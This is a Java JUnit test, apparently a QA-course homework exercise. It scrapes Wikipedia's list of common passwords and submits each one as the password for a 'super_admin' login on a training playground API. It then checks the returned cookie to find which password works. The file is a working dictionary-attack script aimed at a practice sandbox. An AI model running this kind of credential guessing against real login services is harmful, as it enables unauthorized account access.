package sandbox;

import io.restassured.RestAssured;
import io.restassured.response.Response;
import org.jsoup.Jsoup;
import org.jsoup.nodes.Document;
import org.jsoup.nodes.Element;
import org.jsoup.select.Elements;
import org.junit.jupiter.api.Test;

import java.io.IOException;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import static org.junit.jupiter.api.Assertions.assertEquals;

public class PasswordGuessTest {
    @Test
    public void findCorrectPassword() throws IOException {
        // Парсим страницу, чтоб наполнить список
        List<String> passwords = new ArrayList<>();
        Document doc = Jsoup.connect(
                "https://en.wikipedia.org/wiki/List_of_the_most_common_passwords").get();
        Elements rows = doc.selectXpath("//table[@class='wikitable']//td[@align='left']");
        for (Element row : rows) {
            passwords.add(row.text());
        }
        // Перебираем найденные пароли, пока не найдётся возвращающий корректный ответ
        for (String element : passwords) {
            Map<String, String> authData = new HashMap<>();
            authData.put("login", "super_admin");
            authData.put("password", element);

            // Отправляем кандидата на получение куки
            Response response = RestAssured
                    .given()
                    .body(authData)
                    .post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework")
                    .andReturn();

            String cookie = response.getCookie("auth_cookie");

            // Валидируем полученную куку
            Response responseCheckCookie = RestAssured
                    .given()
                    .cookie("auth_cookie", cookie)
                    .get("https://playground.learnqa.ru/ajax/api/check_auth_cookie")
                    .andReturn();
            String correctAnswer = responseCheckCookie.asString();
            // Тормозим перебор и распечатываем ответ, если он найден
            if (!(correctAnswer.equals("You are NOT authorized"))) {
                System.out.println("пароль был: " + element);
                assertEquals(correctAnswer, "You are authorized");
                break;
            }

        }
    }
}
